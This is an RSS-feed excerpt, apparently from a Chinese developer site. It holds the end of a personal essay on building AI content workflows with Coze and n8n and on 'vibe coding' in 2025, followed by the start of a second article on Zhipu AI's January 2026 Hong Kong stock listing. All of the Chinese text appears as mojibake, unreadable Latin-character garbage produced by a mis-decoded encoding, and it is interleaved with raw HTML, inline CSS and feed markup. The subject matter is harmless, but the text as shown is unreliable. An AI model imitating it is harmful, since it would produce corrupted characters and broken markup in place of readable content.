<p>å½“ä¸€æ¡æµç¨‹è·‘é€šä¹‹åï¼Œæˆ‘å‘ç°å¾ˆå¤šä»¥å‰æƒ³éƒ½ä¸æ•¢æƒ³çš„äº‹ï¼Œçªç„¶å˜å¾—å¯ä»¥è¯•ä¸€è¯•äº†ã€‚æ¯”å¦‚åŒæ—¶èµ·å¤šä¸ªå…¬ä¼—å·ï¼Œä¸åŒæ–¹å‘ã€ä¸åŒé£æ ¼ï¼Œç”¨åŒä¸€å¥—æ€è·¯å»è·‘ï¼›æ¯”å¦‚æŠŠå†…å®¹ç”Ÿäº§è¿™ä»¶äº‹ï¼Œä»é«˜æ¶ˆè€—çš„çµæ„Ÿåˆ›ä½œï¼Œå˜æˆä¸€å¥—å¯ä»¥åå¤æ‰§è¡Œã€ä¸æ–­è°ƒæ•´çš„æµç¨‹ã€‚å“ªæ€•æœ€åæ•ˆæœä¸€èˆ¬ï¼Œä¹Ÿè‡³å°‘ä¸ç”¨å†è¢«ä»é›¶å¼€å§‹çš„æˆæœ¬åŠé€€ã€‚</p>
<p>ä¹Ÿæ­£æ˜¯ä»é‚£ä¸€åˆ»å¼€å§‹ï¼Œæˆ‘çœŸæ­£æŠŠæ³¨æ„åŠ›ä»â€œç”¨ AI å†™ä»£ç â€ï¼Œè½¬å‘äº†â€œç”¨ AI æ­æµç¨‹ã€åšéªŒè¯â€ã€‚ é‚£ä¸€åˆ»æˆ‘ä¹Ÿæ„è¯†åˆ°ï¼Œ<strong>AI ä¸åªæ˜¯å¸®æˆ‘æŠŠäº‹æƒ…åšå¾—æ›´å¿«ï¼Œå®ƒä¹Ÿåœ¨æ‚„æ‚„æ‹“å®½æˆ‘èƒ½å°è¯•çš„è¾¹ç•Œã€‚</strong></p>
<hr/>
<h3 data-id="heading-8">ä¹ Â· ä»æ‘¸ç´¢åˆ°ç³»ç»Ÿå­¦ä¹ ï¼šæˆ‘å¼€å§‹çœŸæ­£å­¦ AI</h3>
<p>çœŸæ­£å¼€å§‹å­¦ AI ä¹‹åï¼Œæˆ‘æ‰å‘ç°è‡ªå·±ä¹‹å‰åªæ˜¯æ‰“å¼€äº†ä¸€æ‰‡çª—ã€‚ ä¸€å¼€å§‹å®Œå…¨æ˜¯é è‡ªå·±æ‘¸ç´¢ï¼Œè¿›åº¦å…¶å®å¾ˆæ…¢ï¼Œå¾ˆå¤šä¸œè¥¿éƒ½æ˜¯é›¶é›¶æ•£æ•£åœ°è¯•ã€‚åæ¥æˆ‘å¼€å§‹æœ‰æ„è¯†åœ°å»æ‰¾ä¸€äº›å·²ç»åœ¨è¿™ä¸ªé¢†åŸŸé‡Œè·‘å‡ºæ¥çš„å¤§ä½¬ï¼Œå»çœ‹ä»–ä»¬æ˜¯æ€ä¹ˆåšçš„ï¼Œä¹Ÿé¡ºå¸¦æ¥è§¦åˆ°äº†å¸‚é¢ä¸Šå¤§é‡å…³äºå‰¯ä¸šå’Œ AI çš„å†…å®¹ã€‚æ…¢æ…¢åœ°ï¼Œæˆ‘ä¹Ÿçœ‹æ¸…äº†ä¸€ä¸ªç°å®ï¼šè¿™ç±»å†…å®¹é‡Œï¼Œè¥é”€å äº†å¾ˆå¤§ä¸€éƒ¨åˆ†ï¼Œä¸æ˜¯è®©ä½ åŠ ç¾¤ï¼Œå°±æ˜¯æŠŠä½ å¾€æ˜Ÿçƒã€ç§æ•™é‡Œå¼•ï¼Œçœ‹èµ·æ¥å¾ˆè¯±äººï¼Œä½†å¤šå°‘ä¹Ÿä¼šè®©äººè­¦æƒ•â€œå‰²éŸ­èœâ€ã€‚</p>
<p>ä»¥å‰æˆ‘ä¹Ÿå¸¸å¬ä¸€å¥è¯ï¼Œè¯´<strong>æ•™ä½ èµšé’±çš„äººï¼Œèµšçš„å¾€å¾€æ˜¯ä½ çš„é’±ï¼ŒçœŸæ­£èµšé’±çš„äººä¸ºä»€ä¹ˆè¦æ•™ä½ èµšé’±</strong>ã€‚åæ¥æˆ‘åè€Œè§‰å¾—ï¼Œè¿™å¥è¯åªè¯´å¯¹äº†ä¸€åŠã€‚å¦‚æœä»”ç»†å»çœ‹é‚£äº›çœŸæ­£æŠŠå‰¯ä¸šåšèµ·æ¥çš„äººï¼Œä¼šå‘ç°ä»–ä»¬å¤§å¤šéƒ½æœ‰ä¸€æ•´å¥—å®Œæ•´çš„è·¯å¾„å’ŒçŸ©é˜µï¼šå…ˆæŠŠæŸä¸ªæŠ€æœ¯æ–¹å‘è·‘é€šï¼Œå†æŠŠç»éªŒæ•´ç†å‡ºæ¥è¾“å‡ºï¼Œæ¥ç€æ‰æ˜¯ç¤¾ç¾¤ã€æ˜Ÿçƒã€ç§æ•™è¿™äº›å½¢å¼ã€‚ä»å•†ä¸šè§’åº¦çœ‹ï¼Œè¿™æ¡é“¾è·¯æœ¬èº«æ˜¯æˆç«‹çš„ï¼Œè€Œä¸”é€»è¾‘ä¹Ÿå¾ˆæ¸…æ™°ã€‚</p>
<p>ä¹Ÿæ­£æ˜¯åŸºäºè¿™ç§è®¤çŸ¥ï¼Œæˆ‘æ…¢æ…¢æ¥å—äº†ä¸€ä»¶äº‹ï¼š <strong>å·¥ä½œæµåšå¾—å†å¥½ï¼Œä¹Ÿåªæ˜¯å·¥å…·ï¼Œå®ƒåªèƒ½é™ä½å­¦ä¹ æˆæœ¬ï¼Œå´ä¸æ˜¯å˜ç°çš„æ ¸å¿ƒã€‚çœŸæ­£å†³å®šèƒ½ä¸èƒ½èµšé’±çš„ï¼Œæ°¸è¿œæ˜¯å•†ä¸šåŒ–èƒ½åŠ›ã€‚</strong> æƒ³èµ°æ·å¾„ã€åªé ç™½å«–ï¼Œå‡ ä¹æ˜¯ä¸ç°å®çš„ã€‚ä½†å¯¹æˆ‘æ¥è¯´ï¼Œä¸å…¶çº ç»“â€œä¼šä¸ä¼šè¢«å‰²â€ï¼Œä¸å¦‚å…ˆæ‰¿è®¤ä¸€ç‚¹â€”â€”å­¦ä¹ æœ¬èº«å°±æ˜¯è¦ä»˜å‡ºä»£ä»·çš„ã€‚è‡³å°‘åœ¨è¿™ä¸ªé˜¶æ®µï¼Œæ¯”èµ·æ€¥ç€å˜ç°ï¼Œæˆ‘æ›´åœ¨æ„çš„æ˜¯æŠŠè¿™æ¡è·¯çœ‹æ¸…æ¥šã€èµ°æ‰å®ã€‚</p>
<hr/>
<h3 data-id="heading-9">åÂ· è§†é‡è¢«å½»åº•æ‰“å¼€ï¼šæˆ‘æ‰åˆšæ¨å¼€ AI çš„ä¸€æ‰‡çª—</h3>
<p>å½“æˆ‘å¼€å§‹ç³»ç»ŸæŠ˜è…¾ AI ä¹‹åï¼Œæ‰å‘ç°è‡ªå·±ä¹‹å‰çœ‹åˆ°çš„ï¼Œå…¶å®åªæ˜¯å†°å±±ä¸€è§’ã€‚ æœ€åˆæˆ‘è¿˜åœç•™åœ¨æ‰£å­å·¥ä½œæµè¿™ä¸€å±‚ï¼Œä½†å¾ˆå¿«æˆ‘å°±é‡åˆ°äº†æ–°çš„é—®é¢˜ï¼šå¦‚æœæµç¨‹å†å¤æ‚ä¸€ç‚¹ï¼Œæˆ–è€…éœ€è¦å’Œå¤–éƒ¨ç³»ç»Ÿæ‰“é€šï¼Œå•é æ‰£å­å·²ç»æœ‰äº›å—é™äº†ã€‚ä¹Ÿæ­£æ˜¯åœ¨è¿™ä¸ªé˜¶æ®µï¼Œæˆ‘å¼€å§‹æ¥è§¦å¹¶å­¦ä¹  <strong>n8n</strong>ã€‚</p>
<p>æ¥è§¦ n8n ä¹‹åï¼Œæˆ‘çš„æ€è·¯å‘ç”Ÿäº†ä¸€æ¬¡æ˜æ˜¾å˜åŒ–ã€‚ å®ƒæ›´åå·¥ç¨‹åŒ–ï¼Œä¹Ÿæ›´è‡ªç”±ï¼Œè®©æˆ‘ç¬¬ä¸€æ¬¡å¼€å§‹è®¤çœŸæ€è€ƒï¼šèƒ½ä¸èƒ½æŠŠæ‰£å­å·¥ä½œæµå½“æˆå…¶ä¸­çš„ä¸€ç¯ï¼ŒåµŒè¿›ä¸€æ¡æ›´å¤§çš„è‡ªåŠ¨åŒ–é“¾è·¯é‡Œã€‚æ¯”å¦‚ï¼Œç”¨ n8n è´Ÿè´£è°ƒåº¦ã€åˆ†å‘å’Œå¯¹æ¥æ¥å£ï¼Œç”¨æ‰£å­è´Ÿè´£å†…å®¹ç”Ÿæˆï¼ŒæŠŠåŸæœ¬åˆ†æ•£çš„èƒ½åŠ›ï¼ŒçœŸæ­£ä¸²æˆä¸€æ¡å¯ä»¥åå¤è·‘çš„æµç¨‹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/111d2a73119a4963b69611b7d06728e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768441804&amp;x-signature=4CoucStc8dqoya3S7D00OFwloRo%3D" alt="image-20260107155752285" loading="lazy"/></p>
<p>éšç€æ¯å¤©ä¸‹ç­å›å®¶ä¸æ–­å­¦ä¹ å’Œå‚è€ƒåˆ«äººçš„å®è·µï¼Œæˆ‘æ‰å¼€å§‹æ…¢æ…¢äº†è§£åˆ°ï¼ŒAI çš„ä¸–ç•Œè¿œä¸æ­¢ä¸€ç§å½¢æ€ã€‚ é™¤äº† Coze å’Œ n8n è¿™æ ·çš„å·¥ä½œæµå·¥å…·ï¼Œå›¾åƒç”Ÿæˆä¹Ÿä¸åªæ˜¯ç®€å•ç‚¹å‡ ä¸‹ï¼šå³æ¢¦ã€LiblibAIã€Nano Banana å„è‡ªæœ‰ä¸åŒä¾§é‡ï¼›å†å¾€æ·±ä¸€ç‚¹ï¼Œè¿˜æœ‰æ›´åº•å±‚ã€æ›´è‡ªç”±çš„ ComfyUIï¼›è§†é¢‘æ–¹å‘ä¸Šï¼Œä¹Ÿå¼€å§‹å‡ºç°åƒ <strong>Sora2</strong> è¿™æ ·çš„èƒ½åŠ›çªç ´ï¼›å†åŠ ä¸Šæ•°æ®ç¼–æ’ã€å¤šç»´è¡¨æ ¼ã€å„ç§ API æ¥å£å’Œæˆæœ¬å¯¹æ¯”ï¼Œæ•´ä¸ªç”Ÿæ€è¿œæ¯”æˆ‘ä¸€å¼€å§‹æƒ³è±¡å¾—è¦å¤æ‚å¾—å¤šã€‚</p>
<p>ä½†ä¹Ÿæ­£æ˜¯è¿™ç§å¤æ‚ï¼Œè®©æˆ‘ç¬¬ä¸€æ¬¡çœŸæ­£æ„Ÿåˆ°å…´å¥‹ã€‚ å®ƒä¸å†æ˜¯â€œå­¦ä¼šä¸€ä¸ªå·¥å…·å°±ç»“æŸâ€çš„é‚£ç§ç¡®å®šæ€§ï¼Œè€Œæ˜¯çªç„¶å‡ºç°äº†ä¸€å¤§ç‰‡å¯ä»¥ç»§ç»­æ¢ç´¢ã€æ‹†è§£å’Œç»„åˆçš„ç©ºé—´ã€‚æ¯å¤©éƒ½ä¼šå†’å‡ºæ–°çš„é—®é¢˜ï¼šè¿™ä¸ªèƒ½åŠ›èƒ½ä¸èƒ½æ¥åˆ°æµç¨‹é‡Œï¼Ÿé‚£ä¸ªæ¨¡å‹æ¢æ‰ä¼šä¸ä¼šæ›´åˆé€‚ï¼Ÿæˆæœ¬è¿˜èƒ½ä¸èƒ½å†å‹ä¸€å‹ï¼Ÿæˆ‘å¼€å§‹æœ‰ä¸€ç§å¾ˆä¹…æ²¡æœ‰è¿‡çš„æ„Ÿè§‰â€”â€”<strong>å¥½åƒåˆæœ‰ä¸œè¥¿å€¼å¾—æˆ‘ç»§ç»­å­¦ä¸‹å»äº†ã€‚</strong></p>
<p>ä¹Ÿæ­£æ˜¯åœ¨è¿™ä¸ªé˜¶æ®µï¼Œæˆ‘æ‰é€æ¸æ„è¯†åˆ°ä¸€ä¸ªåˆ†æ­§ç‚¹çš„å­˜åœ¨ã€‚ ä¹Ÿæœ‰åŒå­¦ä¼šè§‰å¾—ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦æ­ä»€ä¹ˆå•†ä¸šç‰ˆå›¾ï¼Œåªè¦ä¼šç”¨å·¥å…·å˜ç°å°±å¤Ÿäº†ã€‚ç°åœ¨ç½‘ä¸Š AI å·¥å…·ä¸€å¤§æŠŠï¼Œæƒ³ç”¨ä»€ä¹ˆç›´æ¥æœã€ç›´æ¥ç”¨ï¼Œä¼¼ä¹ä¹Ÿæ²¡å¿…è¦è‡ªå·±å»æŠ˜è…¾ï¼Œç”¨ AI å»åˆ›é€ ä»€ä¹ˆã€‚</p>
<p>ä½†è¶Šå¾€ä¸‹èµ°ï¼Œæˆ‘åè€Œè¶Šè­¦æƒ•ä¸€ä»¶äº‹ï¼š å¦‚æœåªåœç•™åœ¨ç”¨ç°æˆå·¥å…·ï¼Œæœ¬è´¨ä¸Šæˆ‘ä»¬ç”¨çš„ï¼Œå§‹ç»ˆæ˜¯åˆ«äººçš„èƒ½åŠ›å°è£…ã€‚å·¥å…·æ€ä¹ˆç”¨ã€èƒ½åŠ›è¾¹ç•Œåœ¨å“ªã€ä»·å€¼æ€ä¹ˆåˆ†é…ï¼Œæ—©å°±è¢«åˆ«äººè®¾è®¡å¥½äº†ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œçœ‹ç€åˆ«äººåƒè‚‰ï¼Œæˆ‘ä»¬å¤§æ¦‚ç‡è¿æ±¤éƒ½å¾ˆéš¾å–åˆ°ã€‚èƒ½åŠ›è¾¹ç•Œä¸æ˜¯è‡ªå·±å®šçš„ï¼Œæœ€åå¾ˆå®¹æ˜“å°±å˜æˆè¢«æ”¶å‰²çš„é‚£ä¸€å±‚äººã€‚</p>
<p>ä¹Ÿæ­£æ˜¯æ„è¯†åˆ°è¿™ä¸€ç‚¹ï¼Œæˆ‘æ‰çœŸæ­£æ˜ç™½ï¼Œè‡ªå·±è¿™ä¸€é˜¶æ®µçš„â€œå¿™ç¢Œâ€ä»ä½•è€Œæ¥ã€‚ ä¸æ˜¯å› ä¸ºå·¥å…·å˜å¤šäº†ï¼Œè€Œæ˜¯æˆ‘å¼€å§‹æŠŠè¢« AI è§£æ”¾å‡ºæ¥çš„æ—¶é—´ï¼Œç”¨æ¥è®­ç»ƒä¸€ä»¶äº‹â€”â€”<strong>å¦‚ä½•ç†è§£èƒ½åŠ›ã€ç»„åˆèƒ½åŠ›ï¼Œè€Œä¸æ˜¯åªåœç•™åœ¨ä½¿ç”¨å±‚é¢ã€‚</strong> ç›´åˆ°è¿™æ—¶æˆ‘æ‰æ„è¯†åˆ°ï¼Œè‡ªå·±æˆ–è®¸çœŸçš„åªæ˜¯åˆšåˆšæ¨å¼€äº† AI çš„ä¸€æ‰‡çª—ã€‚</p>
<hr/>
<h3 data-id="heading-10">åä¸€ Â· å›å¤´çœ‹ 2025ï¼šè¿™å°±æ˜¯æˆ‘çš„ Vibe Coding æ—¶åˆ»</h3>
<p>å›å¤´çœ‹ 2025 å¹´ï¼Œæˆ‘è§‰å¾—è‡ªå·±çœŸæ­£çš„è½¬å˜ï¼Œå¹¶ä¸æ˜¯ç”¨äº†å¤šå°‘ AI å·¥å…·ã€‚ è¿™ä¸€å¹´ï¼ŒAI å¹¶æ²¡æœ‰è®©æˆ‘èººå¹³ï¼Œåè€Œè®©æˆ‘å˜å¾—æ›´å¿™äº†ã€‚å®ƒæŠŠä¸€éƒ¨åˆ†é‡å¤ã€æ¶ˆè€—çš„äº‹æƒ…æ¥äº†è¿‡å»ï¼Œä¹ŸæŠŠæˆ‘æ¨å‘äº†å¦ä¸€ç±»æ›´éš¾çš„äº‹æƒ…â€”â€”æ€è€ƒã€åˆ¤æ–­ã€æ‹†é—®é¢˜ã€æ­æµç¨‹ã€åšéªŒè¯ã€‚</p>
<p>ä»ä¸€å¼€å§‹ç”¨ AI å†™ä»£ç ã€æŸ¥é—®é¢˜ï¼Œåˆ°åæ¥å¼€å§‹å­¦ AIã€æ­å·¥ä½œæµï¼Œå†åˆ°å°è¯•æŠŠä¸åŒèƒ½åŠ›ç»„åˆèµ·æ¥ï¼Œæˆ‘æ…¢æ…¢æ„è¯†åˆ°ï¼Œè‡ªå·±çš„è§’è‰²æ­£åœ¨å‘ç”Ÿå˜åŒ–ã€‚æˆ‘ä¸å†åªæ˜¯è¢«éœ€æ±‚æ¨ç€å¾€å‰èµ°çš„æ‰§è¡Œè€…ï¼Œè€Œæ˜¯åœ¨ä¸æ–­åšé€‰æ‹©çš„äººï¼šé€‰ç”¨ä»€ä¹ˆèƒ½åŠ›ã€æ€ä¹ˆç»„åˆã€è¿™æ¡è·¯å€¼ä¸å€¼å¾—ç»§ç»­è¯•ä¸‹å»ã€‚</p>
<p>è¿™å¤§æ¦‚å°±æ˜¯æˆ‘ç†è§£é‡Œçš„ Vibe Codingã€‚ å®ƒä¸æ˜¯å·æ‡’ï¼Œä¹Ÿä¸æ˜¯å°‘å†™ä»£ç ï¼Œè€Œæ˜¯ä»â€œæ•²ä»£ç çš„äººâ€ï¼Œå˜æˆäº†â€œè®¾è®¡æµç¨‹çš„äººâ€ã€‚AI è®©æˆ‘å†™ä»£ç æ›´è½»æ¾ï¼Œä¹Ÿè®©æˆ‘ç¬¬ä¸€æ¬¡æœ‰æœºä¼šæŠŠç²¾åŠ›èŠ±åœ¨æ›´æœ‰ä»·å€¼çš„åœ°æ–¹â€”â€”æŠŠé—®é¢˜æ‹†å¯¹ï¼ŒæŠŠæµç¨‹æ­å¯¹ï¼ŒæŠŠç»“æœäº¤ä»˜å¯¹ã€‚</p>
<p>æœ€è¿‘åˆ·åˆ°ä¸å°‘è§†é¢‘ï¼Œéƒ½åœ¨è¯´ 2026 å¹´å¯èƒ½æ˜¯ AI æ¼«å‰§çš„é¡¶å³°ï¼Œç”šè‡³æ˜¯æœ€åçš„é£å£ã€‚ æˆ‘å¹¶ä¸ç¡®å®šè¿™ç§åˆ¤æ–­å¯¹ä¸å¯¹ï¼Œä¹Ÿä¸å¤ªæƒ³å»èµŒæ‰€è°“çš„â€œæœ€åä¸€æ¬¡æœºä¼šâ€ã€‚ä½†è‡³å°‘åœ¨ 2025 å¹´ï¼Œæˆ‘å·²ç»ä¸å†åªæ˜¯å›´è§‚è¿™äº›å˜åŒ–ï¼Œè€Œæ˜¯å¼€å§‹å°è¯•ç†è§£å®ƒä»¬ã€å‚ä¸å®ƒä»¬ã€‚å“ªæ€•åªæ˜¯ä»ä¸€ä¸ªå¾ˆå°çš„æ–¹å‘å¼€å§‹ï¼Œå»å­¦ä¹ ã€å»éªŒè¯ã€å»åˆ›é€ å±äºè‡ªå·±çš„ä¸œè¥¿ã€‚</p>
<p>ä¹Ÿè®¸æˆ‘ç°åœ¨è¿˜æ²¡æœ‰è·‘å‡ºä»€ä¹ˆç¡®å®šæˆ–æ»¡æ„çš„ç»“æœã€‚ ä½†è‡³å°‘åœ¨è¿™ä¸€å¹´é‡Œï¼Œæˆ‘ç¬¬ä¸€æ¬¡æ˜ç¡®åœ°æ„Ÿå—åˆ°ï¼š<strong>æˆ‘ä¸å†åªæ˜¯æ‰§è¡Œçš„äººï¼Œè€Œæ˜¯åœ¨åšåˆ¤æ–­å’Œé€‰æ‹©çš„äººã€‚</strong> ä»ç”¨ AIï¼Œåˆ°å­¦ AIï¼Œå†åˆ°å°è¯•æ­ AIï¼Œè¿™å°±æ˜¯å±äºæˆ‘çš„ 2025 å¹´â€”â€”ä¸€ä¸ªè¢« AI è§£æ”¾ã€ä¹Ÿè¢« AI ç‰µå¼•ç€å‘å‰çš„ Vibe Coding æ—¶åˆ»ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ™ºè°±AIä»æ¸…åå®éªŒå®¤åˆ°â€œå…¨çƒå¤§æ¨¡å‹ç¬¬ä¸€è‚¡â€çš„å…­å¹´å¾ç¨‹]]></title>    <link>https://juejin.cn/post/7592805973120811014</link>    <guid>https://juejin.cn/post/7592805973120811014</guid>    <pubDate>2026-01-08T10:03:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592805973120811014" data-draft-id="7592805973120794630" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ™ºè°±AIä»æ¸…åå®éªŒå®¤åˆ°â€œå…¨çƒå¤§æ¨¡å‹ç¬¬ä¸€è‚¡â€çš„å…­å¹´å¾ç¨‹"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-08T10:03:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç äº‹æ¼«è°ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ™ºè°±AIä»æ¸…åå®éªŒå®¤åˆ°â€œå…¨çƒå¤§æ¨¡å‹ç¬¬ä¸€è‚¡â€çš„å…­å¹´å¾ç¨‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç äº‹æ¼«è°ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T10:03:28.000Z" title="Thu Jan 08 2026 10:03:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æ¸¯äº¤æ‰€çš„ä¸Šå¸‚é’Ÿå£°ä½™éŸ³æœªç»ï¼ŒåŒ—äº¬æ¸…åç§‘æŠ€å›­çš„ä¸€é—´åŠå…¬å®¤é‡Œï¼Œåˆ›å§‹äººå”æ°åœ¨å†…éƒ¨ä¿¡ä¸­å†™é“ï¼šâ€œæˆ‘ä»¬ä¸æ˜¯æ•²é’Ÿï¼Œæˆ‘ä»¬åªæ˜¯æ‹¿åˆ°äº†ä¸‹ä¸€åœºç¡¬ä»—çš„å…¥åœºåˆ¸ã€‚â€</p>
</blockquote>
<p>2026å¹´1æœˆ8æ—¥ï¼Œæ™ºè°±AIä»¥æ¯è‚¡116.20æ¸¯å…ƒå‘è¡Œä»·ç™»é™†æ¸¯äº¤æ‰€ä¸»æ¿ï¼Œæˆä¸ºä¸­å›½é¦–å®¶é€šç”¨äººå·¥æ™ºèƒ½åŸºåº§æ¨¡å‹ä¸Šå¸‚å…¬å¸ã€‚</p>
<p>è¿™å®¶è¯ç”Ÿäºæ¸…åå¤§å­¦è®¡ç®—æœºç³»çŸ¥è¯†å·¥ç¨‹å®éªŒå®¤çš„å…¬å¸ï¼Œç”¨å…­å¹´æ—¶é—´èµ°è¿‡äº†ä»å­¦æœ¯ç ”ç©¶åˆ°äº§ä¸šè½åœ°çš„æ›²æŠ˜é“è·¯ã€‚<strong>è¿ç»­å…«è½®èèµ„ç´¯è®¡è¶…è¿‡83äº¿å…ƒ</strong>ï¼ŒGLMç³»åˆ—æ¨¡å‹å·²æœåŠ¡äº<strong>è¶…è¿‡1.2ä¸‡å®¶ä¼ä¸šå®¢æˆ·å’Œ8000ä¸‡å°ç»ˆç«¯è®¾å¤‡</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-0">01 èµ·æº</h2>
